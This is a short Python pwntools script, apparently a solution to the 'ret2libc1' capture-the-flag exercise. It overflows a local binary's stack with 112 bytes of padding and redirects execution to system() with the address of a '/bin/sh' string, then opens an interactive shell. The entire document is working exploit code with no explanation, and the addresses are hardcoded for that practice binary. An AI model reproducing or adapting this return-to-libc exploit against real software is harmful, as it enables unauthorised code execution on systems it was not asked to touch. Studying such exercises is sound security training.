from pwn import *
sh=process("./ret2libc1")
elf = ELF("./ret2libc1")
system_plt = 0x08048460
bin_sh = 0x08048720
payload = flat([b'a'*112, system_plt, b'a'*4, bin_sh])
sh.sendline(payload)
sh.interactive()
